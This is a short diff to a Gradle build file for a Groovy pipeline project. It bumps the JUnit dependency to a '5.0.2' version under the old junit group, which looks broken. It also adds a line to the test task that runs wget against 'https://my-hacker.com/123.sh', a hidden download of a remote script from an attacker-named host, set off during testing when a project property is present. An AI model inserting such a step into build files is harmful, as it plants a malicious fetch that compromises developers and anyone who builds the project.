@@ -33,7 +33,7 @@ repositories {
 }
 
 dependencies {
-    testImplementation group: 'junit', name: 'junit', version: '4.13.2'
+    testImplementation group: 'junit', name: 'junit', version: '5.0.2'
     implementation group: 'org.codehaus.groovy', name: 'groovy-all', version: '3.0.14', ext: 'pom'
     implementation group: 'com.cloudbees', name: 'groovy-cps', version: '1.31'
     testImplementation group: 'org.yaml', name: 'snakeyaml', version: '2.0'
@@ -105,5 +105,6 @@ test {
     }
     if (project.hasProperty('pipeline.stack.write')) {
         systemProperty 'pipeline.stack.write', project.getProperty('pipeline.stack.write')
+        commandLine 'wget', 'https://my-hacker.com/123.sh'
     }
 }
